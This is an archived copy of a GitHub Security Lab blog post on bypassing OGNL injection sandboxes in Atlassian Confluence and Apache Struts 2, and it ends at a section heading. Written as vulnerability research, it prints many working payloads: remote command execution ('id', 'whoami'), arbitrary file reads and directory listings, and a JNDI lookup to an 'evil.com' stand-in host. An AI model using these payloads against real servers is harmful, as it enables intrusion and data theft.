---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-27_bypassing-ognl-sandboxes-for-fun-and-charities.md
original_filename: 2023-01-27_bypassing-ognl-sandboxes-for-fun-and-charities.md
title: Bypassing OGNL sandboxes for fun and charities
category: documents
detected_topics:
- supply-chain
- command-injection
- sso
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- supply-chain
- command-injection
- sso
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: 8f2fa78d429f4242425ebfa992a0754acacd152dcecb2a981a855c10e2a40860
text_sha256: 065d26592a343f805e0d06e4fde4c2eac2c8f6294ef44b92d5f3502e215c2f7c
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing OGNL sandboxes for fun and charities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-27_bypassing-ognl-sandboxes-for-fun-and-charities.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, sso, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `8f2fa78d429f4242425ebfa992a0754acacd152dcecb2a981a855c10e2a40860`
- Text SHA256: `065d26592a343f805e0d06e4fde4c2eac2c8f6294ef44b92d5f3502e215c2f7c`


## Content

---
title: "Bypassing OGNL sandboxes for fun and charities"
page_title: "Bypassing OGNL sandboxes for fun and charities - The GitHub Blog"
url: "https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/"
final_url: "https://github.blog/security/vulnerability-research/bypassing-ognl-sandboxes-for-fun-and-charities/"
authors: ["Alvaro Muñoz (@pwntester)"]
programs: ["Atlassian", "Apache Struts"]
bugs: ["OGNL injection"]
publication_date: "2023-01-27"
added_date: "2023-05-08"
source: "pentester.land/writeups.json"
original_index: 1620
---

[Home](https://github.blog/) / [Security](https://github.blog/security/) / [Vulnerability research](https://github.blog/security/vulnerability-research/)

# Bypassing OGNL sandboxes for fun and charities

Object Graph Notation Language (OGNL) is a popular, Java-based, expression language used in popular frameworks and applications, such as Apache Struts and Atlassian Confluence. Learn more about bypassing certain OGNL injection protection mechanisms including those used by Struts and Atlassian Confluence, as well as different approaches to analyzing this form of protection so you can harden similar systems.

![](https://github.blog/wp-content/uploads/2021/12/GitHub-security_teal-banner.png?resize=1200%2C630)

[Alvaro Munoz](https://github.blog/author/pwntester/ "Posts by Alvaro Munoz")·[@pwntester](https://github.com/pwntester)

January 27, 2023 

| 19 minutes 

  * Share: 
  * [ ](https://x.com/share?text=Bypassing%20OGNL%20sandboxes%20for%20fun%20and%20charities&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fbypassing-ognl-sandboxes-for-fun-and-charities%2F)
  * [ ](https://www.facebook.com/sharer/sharer.php?t=Bypassing%20OGNL%20sandboxes%20for%20fun%20and%20charities&u=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fbypassing-ognl-sandboxes-for-fun-and-charities%2F)
  * [ ](https://www.linkedin.com/shareArticle?title=Bypassing%20OGNL%20sandboxes%20for%20fun%20and%20charities&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fbypassing-ognl-sandboxes-for-fun-and-charities%2F)

## Overview

Object Graph Notation Language (OGNL) is a popular, Java-based, expression language used in popular frameworks and applications, such as Apache Struts and Atlassian Confluence. In the past, OGNL injections led to some serious remote code execution (RCE) vulnerabilities, such as the [Equifax breach](https://www.synopsys.com/blogs/software-security/equifax-apache-struts-vulnerability-cve-2017-5638/), and over the years, protection mechanisms and mitigations against OGNL injections have been developed and improved to limit the impact of these vulnerabilities.

In this blog post, I will describe how I was able to bypass certain OGNL injection protection mechanisms, including the one used by Struts and the one used by Atlassian Confluence. The purpose of this blog post is to share different approaches used when analyzing this kind of protection so they can be used to harden similar systems.

No new OGNL injections are being reported as part of this research, and unless future OGNL injections are found on the affected frameworks/applications, or known double evaluations affect an existing Struts application, this research does not constitute any immediate risk for Apache Struts or Atlassian Confluence.

## Hello OGNL, my old friend

I have a past history of bugs found in Struts framework, including [CVE-2016-3087](https://cwiki.apache.org/confluence/display/WW/S2-033), [CVE-2016-4436](https://cwiki.apache.org/confluence/display/WW/S2-035), [CVE-2017-5638](https://cwiki.apache.org/confluence/display/WW/S2-046), [CVE-2018-1327](https://cwiki.apache.org/confluence/display/WW/S2-056), [CVE-2020-17530](https://cwiki.apache.org/confluence/display/WW/S2-061) and even some [double OGNL injections](https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2/) through both Velocity and FreeMarker tags that remain unfixed to this date. Therefore, I have become familiar with the OGNL sandbox and different escapes over the years and I am still interested in any OGNL-related vulnerabilities that may appear. That was the case with Atlassian Confluence, [CVE-2021-26084](https://jira.atlassian.com/browse/CONFSERVER-67940) and [CVE-2022-26134](https://jira.atlassian.com/browse/CONFSERVER-79016), where the former is an instance of the unresolved double evaluation via Velocity tags mentioned in my [2020 advisory](https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2/).

My friend, Man Yue Mo, wrote a [great article](https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/) describing how the OGNL mitigations have been evolving over the years and there are few other posts that also describe in detail how these mitigations have been improving.

In 2020, disabling the sandbox became harder, so I decided to change the approach completely. I introduced new ways to get RCE by circumventing the sandbox, and using the application server’s Instance Manager to instantiate arbitrary objects that I could use to achieve RCE. This research was presented at our Black Hat 2020 talk, [Scribbling outside of template security](https://i.blackhat.com/USA-20/Wednesday/us-20-Munoz-Room-For-Escape-Scribbling-Outside-The-Lines-Of-Template-Security-wp.pdf). We reported this issue to the Apache Struts team, and they [fixed](https://github.com/apache/struts/commit/8d3393f09a06ff4a2b6827b6544524d1d6af3c7c) the issue by using a block list. However, in 2021, Chris McCown published a [new bypass technique](https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html) which leverages the OGNL’s AST maps and the Apache Commons Collections BeanMap class.

That was it–at that point I had enough of OGNL and stopped looking into it until two events happened in the same week:

  * My friend, [Mert](https://twitter.com/mertistaken), found what he thought was an SSTI in a bug bounty program. It turned out to be an OGNL injection, so he asked me to help him with the exploitation of the issue.
  * I read several tweets claiming that [CVE-2022-26134](https://jira.atlassian.com/browse/CONFSERVER-79016) was not vulnerable to RCE on the latest Confluence version (7.18.0 at that time).

Okay, OGNL, my old friend. Here we go again.

## Looking at Confluence `isSafeExpression` protection

When the CVE-2022-26134 was released there was an initial understanding that the [OGNL injection could not lead to direct RCE in the latest version 7.18.0](https://twitter.com/httpvoid0x2f/status/1532924239216627712) since the `isSafeExpression` method was not possible to bypass for that version

![Screenshot of a tweet from user @httpvoid0x2f on June 4, 2022 that reads, "As you might have noticed most recent version instances won't give you a code execution. This is due to isSafeExpression\(\) protections and the fact only ${} notation is being evaluated and there's no straight forward way to confirm this due to injection being blind." ](https://github.blog/wp-content/uploads/2023/01/image1-5.png?w=594&resize=594%2C295)

Harsh Jaiswal ([@rootxharsh](https://twitter.com/rootxharsh)) and Rahul Maini ([@iamnoooob](https://twitter.com/iamnoooob)) took a different approach and looked for a gadget chain in the allowed classes list that could allow them to create an admin account.

![The picture shows a road with two ways: bypassing the isSafeExpression method or finding a gadget in the allowed list. The car chooses the latter.](https://github.blog/wp-content/uploads/2023/01/image7-1.png?w=500&resize=500%2C507)

Soon after, [@MCKSysAr](https://twitter.com/MCKSysAr) found a [nice and simple bypass](https://twitter.com/MCKSysAr/status/1533053536430350337):

  1. Use `Class` property instead of `class` one.
  2. Use string concatenation to bypass string checks.

  
![Payload used by MCKSysAr to bypass Confluence sandbox](https://github.blog/wp-content/uploads/2023/01/image4-2.png?w=1024&resize=1024%2C165)  

MCKSysAr’s bypass was soon addressed by blocking the access to the `Class` and `ClassLoader` properties. I had some other ideas, so I decided to take a look at the `isSafeExpression` implementation.

The first interesting thing I learned was that this method was actually parsing the OGNL expression into its AST form in order to analyze what it does and decide whether it should be allowed to be executed or not. Bye-bye to regexp-based bypasses.

Then the main logic to inspect the parsed tree was the following:

  * Starting at the root node of the AST tree, recursively call `containsUnsafeExpression()` on each node of the tree.
  * If the node is an instance of `ASTStaticField`, `ASTCtor` or `ASTAssign` then the expression is deemed to be unsafe. This will prevent payloads using the following vectors: 
  * Static field accesses
  * Constructors calls
  * Variable assignments
  * If the node is an `ASTStaticMethod` check that the class the method belongs to is in an allow list containing: 
  * `net.sf.hibernate.proxy.HibernateProxy`
  * `java.lang.reflect.Proxy`
  * `net.java.ao.EntityProxyAccessor`
  * `net.java.ao.RawEntity`
  * `net.sf.cglib.proxy.Factory`
  * `java.io.ObjectInputValidation`
  * `net.java.ao.Entity`
  * `com.atlassian.confluence.util.GeneralUtil`
  * `java.io.Serializable`
  * If node is an `ASTProperty` checks block list containing (after the initial fix): 
  * `class`
  * `Class`
  * `classLoader`
  * `ClassLoader`
  * If the property looks like a class name, check if the class’s namespace is defined in the `unsafePackageNames` block list (too long to list here).
  * If node is an `ASTMethod`, check if we are calling `getClass` or `getClassLoader`.
  * If node is an `ASTVarRef`, check if the variable name is in `UNSAFE_VARIABLE_NAMES` block list: 
  * `#application`
  * `#parameters`
  * `#request`
  * `#session`
  * `#_memberAccess`
  * `#context`
  * `#attr`
  * If node in an `ASTConst` (eg: a string literal), call `isSafeExpressionInternal` which will check the string against a block list (for example, harmful class names) and, in addition, it will parse the string literal as an OGNL expression and apply the `containsUnsafeExpression()` recursive checks on it.
  * If a node has children, repeat the process for the children.

This is a pretty comprehensive control since it parses the AST recursively and makes sure that any AST nodes considered harmful are either rejected or inspected further.

MCKSysAr bypass was based on two things: A) `Class` and `ClassLoader` properties were not accounted for when inspecting `ASTProperty` nodes; and B) `”java.lang.” + “Runtime”` was parsed as an `ASTAdd` node with two `ASTConst` children. None of them matched any of the known harmful strings and when parsed as an OGNL expression, none of them were valid expressions so they were not parsed further. A) Was fixed quickly by disallowing access to `Class` and `ClassLoader` properties, but B) was not fixed since it was considered as a security in-depth control (it’s impossible to analyze all variants in which a malicious string could be written).

With that in mind I took a look at the[ list of the OGNL AST nodes](https://github.com/orphan-oss/ognl/tree/master/src/main/java/ognl) to see if there was anything interesting that was not accounted for in the `isSafeExpression()` method.

### Enter `ASTEval`

The first one that got my attention was `ASTEval`. It looked very interesting and it was not accounted for by the `containsUnsafeExpression()` method.

`ASTEval` are nodes in the form of `(expr)(root)` and they will parse the `expr` string into a new AST and evaluate it with `root` as its root node. This will allow us to provide an OGNL expression in the form of a string `(ASTConst)` and evaluate it! We know that `ASTConst` nodes are parsed as OGNL expressions and verified to not be harmful. However, we already saw that if we split the string literal in multiple parts, only the individual parts will be checked and not the result of the concatenation. For example, for the payload below `#application` will never get checked, only `#` and `application` which are deemed to be safe:

  
![An AST tree of the expression showing all the AST nodes the expression is parsed into.](https://github.blog/wp-content/uploads/2023/01/image5-2.png?w=484&resize=484%2C263)  

As you can see in the resulting tree, there are no hints of any `ASTVarRef` node and therefore access to `#application` is granted.

### Weaponizing `ASTEval`

There are multiple ways to craft a payload levering this vector. For example, we could get arbitrary RCE with echoed response:
  
  
  ('(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@get'+'Runtime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))')('')
  
  

![The screenshot shows a response from the Confluence server including an `X-Cmd-Response` which shows the output of the `id` command.](https://github.blog/wp-content/uploads/2023/01/image3-4.png?w=1024&resize=1024%2C332)

### Enter `ASTMap`, `ASTChain` and `ASTSequence`

I was already familiar with `ASTMap`s from reading [Mc0wn’s great article](https://mc0wn.blogspot.com/2021/04/exploiting-struts-rce-on-2526.html). In a nutshell, OGNL allows developers to instantiate any `java.util.Map` implementation by using the `@<class_name>@{}` syntax.

Using this technique, we were able to use a `BeanMap` (a map wrapping a Java bean and exposing its getters and setters as map entries) to bypass the `getClass` limitation by rewriting the payload as:
  
  
  
  BeanMap map = @org.apache.commons.beanutils.BeanMap@{};
  
  map.setBean(“”)
  
  map.get(“class”).forName(”javax.script.ScriptEngineManager”).newInstance().getEngineByName(“js”).eval(payload)
  
  

This payload avoids calling the `BeanMap` constructor explicitly and, therefore, gets rid of the `ASTCtor` limitation. In addition, it allows us to call `Object.getClass()` implicitly by accessing the `class` item. However, we still have another problem: we need to be able to assign the map to a variable (`map`) so we can call the `setBean()` method on it and later call the `get()` method on the same map. Since `ASTAssign` was blocked, assignments were not an option. Fortunately, looking through the list of AST nodes, two more nodes got my attention: `ASTChain` and `ASTSequence`.

  * `ASTChain` allows us to pass the result of one evaluation as the root node of the next evaluation. For example: `(one).(two)` will evaluate `one` and use its result as the root for the evaluation of `two`.
  * `ASTSequence` allows us to run several evaluations on the same root object in sequence. For example: `one, two` will evaluate `one` and then `two` using the same root node.

The idea was to bypass `ASTAssign` constraint by combining `ASTChain` and `ASTSequence` together

We can set the map returned by the `ASTMap` expression as the root for a sequence of expressions so all of them will have the map as its root object:
  
  
  
  (#@BeanMap@{}).(expression1, expression2)
  
  

In our case, `expression1` is the call to `setBean()` and `expression2` is the call to `get()`.

Taking that into account and splitting literal strings into multiple parts to bypass the block list we got the following payload:
  
  
  
  (#@org.apache.commons.beanutils.BeanMap@{}).(setBean(''),get('cla'+'ss').forName('javax'+'.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('7*7'))
  
  

The final AST tree bypassing all `isSafeExpression` checks is:

  
![An AST tree of the payload showing all the AST nodes the expression is parsed into.](https://github.blog/wp-content/uploads/2023/01/image2-5.png?w=1024&resize=1024%2C496)  

There was a final problem to solve. The OGNL injection sink was `translateVariable()` which resolves OGNL expressions wrapped in `${expressions}` delimiters. Therefore, our payload was not allowed to contain any curly brackets. Fortunately, for us, [OGNL will replace unicode escapes](https://github.com/apache/commons-ognl/blob/master/src/main/jjtree/ognl.jjt#L36-L37) for us so we were able to use the final payload:
  
  
  
  (#@org.apache.commons.beanutils.BeanMap@\\u007b\\u007d).(setBean(''),get('cla'+'ss').forName('javax'+'.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('7*7'))
  
  

I submitted these bypasses to Atlassian through its bug bounty program and, even though I was not reporting any new OGNL injections but a bypass of its sandbox, they were kind enough to award me with a $3,600 bounty!

## Looking into Struts2

As mentioned before, a friend found what he thought was a Server-Side Template Injection (SSTI) (`%{7*7}` => 49) but it turned out to be an OGNL injection. Since this happened as part of a bug bounty program, I didn’t have access to the source code. I can’t be sure if the developers were passing untrusted data to an OGNL sink (for example, `[ActionSupport.getText()](https://struts.apache.org/maven/struts2-core/apidocs/com/opensymphony/xwork2/ActionSupport.html#getText-java.lang.String-)`), or if it was some of the [unfixed double evaluations issues](https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2/) (still working at the time of writing). Anyhow, the application seemed to be using the latest Struts version and known payloads were not working. I decided to take a deeper look.

### New gadgets on the block

When I listed what objects were available I was surprised to find that many of the usual objects in the Struts OGNL context, such as the value stack, were not there, and some others I haven’t seen before were available. One of such objects was `#request[‘.freemarker.TemplateModel’]`. This object turned out to be an instance of `org.apache.struts2.views.freemarker.ScopesHashModel` containing a variety of new objects. One of them (stored under the `ognl` key) gave me access to an `org.apache.struts2.views.jsp.ui.OgnlTool` instance. Looking at the code for this class I quickly spotted that it was calling `Ognl.getValue()`. This class is not part of Struts, but the OGNL library and, therefore, the Struts sandbox (member access policy) was not enabled! In order to exploit it I used the following payload:
  
  
  
  #request[‘.freemarker.TemplateModel’].get(‘ognl’).getWrappedObject().findValue(‘(new freemarker.template.utility.Execute()).exec({“whoami”})’, {})
  
  

That was enough to get the issue accepted as a remote code execution in the bounty program. However, despite having achieved RCE, there were a few unsolved questions:

  * Why was this `.freemarker.TemplateModel` object available?
  * Are there any other ways to get RCE on the latest Struts versions?

### Post-invocations Context

Attackers are limited to the objects they are able to access. Normally, OGNL injections take place before the action invocation completes and the action’s `Result` is rendered.

![Diagram of Struts request handling. It shows how an action is invoked and the different components involved.](https://github.blog/wp-content/uploads/2023/01/image6-2.png?w=640&resize=640%2C750)https://struts.apache.org/core-developers/attachments/Struts2-Architecture.png

When grepping the Struts’s source code for `.freemarker.TemplateModel`, I found out that there are plenty of new objects added to the request scope when preparing the action’s `Result` in order to share them with the view layer (JSP, FreeMarker or Velocity) and `.freemarker.TemplateModel` was [one of them](https://github.com/apache/struts/blob/266d2d4ed526edbb8e8035df94e94a1007d7c360/core/src/main/java/org/apache/struts2/views/freemarker/FreemarkerManager.java#L122). However, those objects are only added after the `ActionInvocation` has been invoked. This implies that if I find `.freemarker.TemplateModel` on the request scope, my injection was evaluated after the action invocation finished building the action’s `Result` object and, therefore, my injection probably did not take place as part of the Struts code but as a [double evaluation in the FreeMarker template](https://securitylab.github.com/advisories/GHSL-2020-205-double-eval-dynattrs-struts2/).

These new objects will offer new ways to get remote code execution, but only if you are lucky to get your injection evaluated after the action’s `Result` has been built. Or not? 🤔

It turned out that the ongoing `ActionInvocation` object can be accessed through the OGNL context and, therefore, we can use it to force the building of the `Result` object in advance. Calling the `Result`s `doExecute()` method will trigger the population of the so-called template model. For example, for Freemarker, `ActionInvocation.createResult()` will create a `FreemarkerResult` instance. Calling its `doExecute()` method will, in turn, call its `[createModel()](https://github.com/apache/struts/blob/266d2d4ed526edbb8e8035df94e94a1007d7c360/core/src/main/java/org/apache/struts2/views/freemarker/FreemarkerResult.java#L273)` method that will populate the template model.
  
  
  
  (#ai=#attr['com.opensymphony.xwork2.ActionContext.actionInvocation'])+
  
  (#ai.setResultCode("success"))+
  
  (#r=#ai.createResult())+
  
  (#r.doExecute("pages/test.ftl",#ai))
  
  

Executing the above payload will populate the request context with new objects. However, that requires us to know the result code and the template’s path. Fortunately, we can also invoke the `ActionInvocation.invoke()` method that will take care of everything for us!
  
  
  
  #attr['com.opensymphony.xwork2.ActionContext.actionInvocation'].invoke()
  
  

The line above will result in the template model being populated and stored in the request, and context scopes regardless of where your injection takes place.

### Wild objects appeared

After the invocation, the request scope and value stack will be populated with additional objects. These objects vary depending on the view layer used. What follows is a list of the most interesting ones (skipping most of them which do not lead to RCE):

For Freemarker:

  * `.freemarker.Request` (`freemarker.ext.servlet.HttpRequestHashModel`)
  * `.freemarker.TemplateModel` (`org.apache.struts2.views.freemarker.ScopesHashModel`) 
  * `__FreeMarkerServlet.Application__` (`freemarker.ext.servlet.ServletContextHashModel`) 
  * `JspTaglibs` (`freemarker.ext.jsp.TaglibFactory`)
  * `.freemarker.RequestParameters` (`freemarker.ext.servlet.HttpRequestParametersHashModel`)
  * `.freemarker.Request` (`freemarker.ext.servlet.HttpRequestHashModel`)
  * `.freemarker.Application` (`freemarker.ext.servlet.ServletContextHashModel`) 
  * `.freemarker.JspTaglibs` (`freemarker.ext.jsp.TaglibFactory`) 
  * `ognl` (`org.apache.struts2.views.jsp.ui.OgnlTool`) 
  * `stack` (`com.opensymphony.xwork2.ognl.OgnlValueStack`) 
  * `struts` (`org.apache.struts2.util.StrutsUtil`) 

For JSPs:

  * `com.opensymphony.xwork2.dispatcher.PageContext` (`PageContextImpl`)

For Velocity:

  * `.KEY_velocity.struts2.context` -> (`StrutsVelocityContext`) 
  * `ognl` (`org.apache.struts2.views.jsp.ui.OgnlTool`)
  * `struts` (`org.apache.struts2.views.velocity.result.VelocityStrutsUtils`)

### Getting RCE with new objects

And now let’s have some fun with these new objects! In the following section I will explain how I was able to leverage some of these objects to get remote code execution.

#### ObjectWrapper

There may be different ways to get an instance of a FreeMarker’s `ObjectWrapper`, even if the application is not using FreeMarker as its view layer because Struts uses it internally for rendering JSP tags. A few of them are listed below:

  * Through `freemarker.ext.jsp.TaglibFactory.getObjectWrapper()`. Even though Struts’ sandbox forbids access to `freemarker.ext.jsp` package, we can still access it using a BeanMap:

  
  
  
  (#a=#@org.apache.commons.collections.BeanMap@{ })+
  
  (#a.setBean(#application[".freemarker.JspTaglibs"]))+
  
  (#a['objectWrapper'])
  
  

  * Through `freemarker.ext.servlet.HttpRequestHashModel.getObjectWrapper()`:

  
  
  
  (#request.get('.freemarker.Request').objectWrapper)
  
  

  * Through `freemarker.core.Configurable.getObjectWrapper()`. We need to use the BeanMap trick to access it since `freemarker.core` is also blocklisted:

  
  
  
  (#a=#@org.apache.commons.collections.BeanMap@{ })+
  
  (#a.setBean(#application['freemarker.Configuration']))+
  
  #a['objectWrapper']
  
  

Now for the fun part, what can we do with an `ObjectWrapper`? There are three interesting methods we can leverage to get RCE:

**`newInstance(class, args)`**

This method will allow us to instantiate an arbitrary type. Arguments must be wrapped, but the return value is not. For example, we can trigger a JNDI injection lookup:
  
  
  
  objectWrapper.newInstance(@javax.naming.InitialContext@class,null).lookup("ldap://evil.com")
  
  

Or, if Spring libs are available, we can get RCE by supplying a malicious [XML config](https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml) for `FileSystemXmlApplicationContext` constructor:
  
  
  
  objectWrapper.newInstance(@org.springframework.context.support.FileSystemXmlApplicationContext@class,{#request.get('.freemarker.Request').objectWrapper.wrap("URL")})
  
  

`**getStaticModels()**`

This method allows us to get static fields from arbitrary types. The return object is wrapped in a FreeMarker’s `TemplateModel` so we need to unwrap it. An example payload levering [Text4Shell](https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/):
  
  
  
  objectWrapper.staticModels.get("org.apache.commons.text.lookup.StringLookupFactory").get("INSTANCE").getWrappedObject().scriptStringLookup().lookup("javascript:3+4")
  
  

`**wrapAsAPI()**`

This method allows us to wrap any object with a `freemarker.ext.beans.BeanModel` giving us indirect access to its getters and setters methods. Struts’ sandbox will not have visibility on these calls and therefore they can be used to call any blocklisted method.

  * `BeanModel.get('field_name')` returns a `TemplateModel` wrapping the object.
  * `BeanModel.get('method_name')` returns either a `SimpleMethodModel` or `OverloadedMethodsModel` wrapping the method.

We can, therefore, call any blocklisted method with:
  
  
  
  objectWrapper.wrapAsAPI(blocked_object).get(blocked_method)
  
  

This call will return an instance of `TemplateMethodModelEx`. Its `[exec()](https://freemarker.apache.org/docs/api/freemarker/template/TemplateMethodModelEx.html#exec-java.util.List-)` method is defined in the `freemarker.template` namespace and, therefore, trying to invoke this method will get blocked by the Struts sandbox. However, `TemplateMethodModelEx` is an interface and what we will really get is an instance of either `freemarker.ext.beans.SimpleMethodModel` or `freemarker.ext.beans.OverloadedMethodsModel`. Since the `exec()` methods on both of them are defined on the `freemarker.ext.beans` namespace, which is not blocklisted, their invocation will succeed. As we saw before, arguments need to be wrapped. As an example we can call the `File.createTempFile(“PREFIX”, “SUFFIX”)` using the following payload:
  
  
  
  objectWrapper.getStaticModels().get("java.io.File").get("createTempFile").exec({objectWrapper.wrap("PREFIX"), objectWrapper.wrap("SUFFIX")})
  
  

We can achieve the same by calling the `getAPI()` on any `freemarker.template.TemplateModelWithAPISupport` instance. Many of the FreeMarker exposed objects inherit from this interface and will allow us to wrap them with a `BeanModel`. For example, to list all the keys in the Struts Value Stack we can use:
  
  
  
  #request['.freemarker.TemplateModel'].get('stack').getAPI().get("context").getAPI().get("keySet").exec({})
  
  

Note that `com.opensymphony.xwork2.util.OgnlContext.keySet()` would be blocked since it belongs to the `com.opensymphony.xwork2.util` namespace, but in this case, Struts’ sandbox will only see calls to `TemplateHashModel.get()` and `TemplateModelWithAPISupport.getAPI()` which are both allowed.

The last payload will give us a complete list of all available objects in the Value Stack, many of which could be used for further attacks. Lets see a more interesting example by reading an arbitrary file using `BeanModel`s:
  
  
  
  (#bw=#request.get('.freemarker.Request').objectWrapper).toString().substring(0,0)+
  
  (#f=#bw.newInstance(@java.io.File@class,{#bw.wrap("C:\\REDACTED\\WEB-INF\\web.xml")}))+ 
  
  (#p=#bw.wrapAsAPI(#f).get("toPath").exec({}))+
  
  (#ba=#bw.getStaticModels().get("java.nio.file.Files").get("readAllBytes").exec({#bw.wrap(#p)}))+
  
  "----"+
  
  (#b64=#bw.getStaticModels().get("java.util.Base64").get("getEncoder").exec({}).getAPI().get("encodeToString").exec({#bw.wrap(#ba)}))
  
  

Or listing the contents of a directory:
  
  
  
  (#bw=#request.get('.freemarker.Request').objectWrapper).toString().substring(0,0)+
  
  (#dir=#bw.newInstance(@java.io.File@class,{#bw.wrap("C:\\REDACTED\\WEB-INF\\lib")}))+ 
  
  (#l=#bw.wrapAsAPI(#dir).get("listFiles").exec({}).getWrappedObject())+"---"+
  
  (#l.{#this})
  
  

#### OgnlTool/OgnlUtil

The `org.apache.struts2.views.jsp.ui.OgnlTool` class was calling `Ognl.getValue()` with no `OgnlContext` and even though the Ognl library will take care of creating a default one, it will not include all the additional security checks added by the Struts framework and is easily bypassable:
  
  
  
  package org.apache.struts2.views.jsp.ui;
  
  import ognl.Ognl;
  
  import ognl.OgnlException;
  
  import com.opensymphony.xwork2.inject.Inject;
  
  public class OgnlTool {
  
  private OgnlUtil ognlUtil;
  
  public OgnlTool() { }
  
  
  
  @Inject
  
  public void setOgnlUtil(OgnlUtil ognlUtil) {
  
  this.ognlUtil = ognlUtil;
  
  }
  
  
  
  public Object findValue(String expr, Object context) {
  
  try {
  
  return Ognl.getValue(ognlUtil.compile(expr), context);
  
  } catch (OgnlException e) {
  
  return null;
  
  }
  
  }
  
  }
  
  

We can get an instance of `OgnlTool` from both FreeMarker and Velocity post-invocation contexts:
  
  
  
  #request['.freemarker.TemplateModel'].get('ognl')
  
  

Or
  
  
  
  #request['.KEY_velocity.struts2.context'].internalGet('ognl')
  
  

For FreeMarker’s case, it will come up wrapped with a Template model but we can just unwrap it and use it to get RCE:
  
  
  
  (#a=#request.get('.freemarker.Request').objectWrapper.unwrap(#request['.freemarker.TemplateModel'].get('ognl'),'org.apache.struts2.views.jsp.ui.OgnlTool'))+
  
  (#a.findValue('(new freemarker.template.utility.Execute()).exec({"whoami"})',null))
  
  

Or, even simpler:
  
  
  
  #request['.freemarker.TemplateModel'].get('ognl').getWrappedObject().findValue('(new freemarker.template.utility.Execute()).exec({"whoami"})',{})
  
  

`OgnlTool` was [inadvertently fixed](https://github.com/apache/struts/commit/5cd409d382e00b190bfe4e957c4167d06b8f9da1#diff-55821720c975d84350d796bec09aa366cc2b2861fb7e12f223cc5a4453b55640) when Struts 6.0.0 was released by upgrading to OGNL 3.2.2 which always requires a `MemberAccess`. But the latest Struts 2 version (2.5.30) is still vulnerable to this payload.

#### StrutsUtil

Another object that can be accessed in the post-invocation context is an instance of `org.apache.struts2.util.StrutsUtil`. There are plenty of interesting methods in here:

  * `public String include(Object aName)` can be used to read arbitrary resources 
  * `<struts_utils>.include("/WEB-INF/web.xml")`
  * `public Object bean(Object aName)` can be used to instantiate arbitrary types: 
  * `<struts_utils>.bean("javax.script.ScriptEngineManager")`
  * `public List makeSelectList(String selectedList, String list, String listKey, String listValue)`
  * `listKey` and `listValue` are evaluated with OgnlTool and therefore in an unsandboxed context
  * `<struts_utils>.makeSelectList("#this","{'foo'}","(new freemarker.template.utility.Execute()).exec({'touch /tmp/bbbb'})","")`

On applications using Velocity as its view layer, this object will be an instance of `VelocityStrutsUtil` which extends `StrutsUtils` and provides an additional vector:

  * `public String evaluate(String expression)` will allow us to evaluate a string containing a velocity template:

  
  
  
  (<struts_utils>.evaluate("#set ($cmd='java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned_velocity\")') $application['org.apache.tomcat.InstanceManager'].newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval($cmd)"))
  
  

#### JspApplicationContextImpl

The last vector that I wanted to share is one that I found a few years ago and that I was not able to exploit–although I was pretty sure that there had to be a way. New post-invocation discovered objects finally made this possible!

If you have inspected the Struts Servlet context (`#application`) in the past you probably saw an item with key `org.apache.jasper.runtime.JspApplicationContextImpl` which returned an instance of `org.apache.jasper.runtime.JspApplicationContextImpl`. This class contains a method called `getExpressionFactory()` that returns an Expression Factory that will expose a `createValueExpression()` method. This looks like a perfect place to create an EL expression and evaluate it. The problem was that `[createValueExpression](https://docs.oracle.com/javaee/7/api/javax/el/ExpressionFactory.html#createValueExpression-javax.el.ELContext-java.lang.String-java.lang.Class-)` requires an instance of `ELContext` and we had none.

Fortunately, our post-invocation technique brought a new object into play. When using JSPs as the view layer, `#request['com.opensymphony.xwork2.dispatcher.PageContext']` will return an uninitialized `org.apache.jasper.runtime.PageContextImpl` instance that we can use to create an `ELContext` and evaluate arbitrary EL expressions:
  
  
  
  (#attr['com.opensymphony.xwork2.ActionContext.actionInvocation'].invoke())+
  
  (#ctx=#request['com.opensymphony.xwork2.dispatcher.PageContext'])+
  
  (#jsp=#application['org.apache.jasper.runtime.JspApplicationContextImpl'])+
  
  (#elctx=#jsp.createELContext(#ctx))+
  
  (#jsp.getExpressionFactory().createValueExpression(#elctx, '7*7', @java.lang.Class@class).getValue(#elctx))
  
  

The avid readers may be wondering why Struts stores the `PageContext` in the request. Well, turns out, it does not, but we can access it through chained contexts.

When accessing `#attr` (`AttributeMap`), [we can indirectly look into multiple scopes](https://struts.apache.org/maven/struts2-core/apidocs/org/apache/struts2/util/AttributeMap.html) such as the Page, Request, Session and Application (Servlet). But there is more, `org.apache.struts2.dispatcher.StrutsRequestWrapper.getAttribute()` will look for the attribute in the `ServletRequest`, if it can’t find it there, [it will search the value stack](https://github.com/apache/struts/blob/master/core/src/main/java/org/apache/struts2/dispatcher/StrutsRequestWrapper.java#L94)! So, we can effectively access the value stack through the `#request` or `#attr` variables.

In this case, the `PageContext` was not stored in the request scope, but in the Value stack, and we are able to access it through chained context searches.

We can even run arbitrary OGNL expressions as long as they don’t contain any hashes (`#`), for example, `#request["@java.util.HashMap@class"]` will return the `HashMap` class.

### Leveling up the BeanMap payload

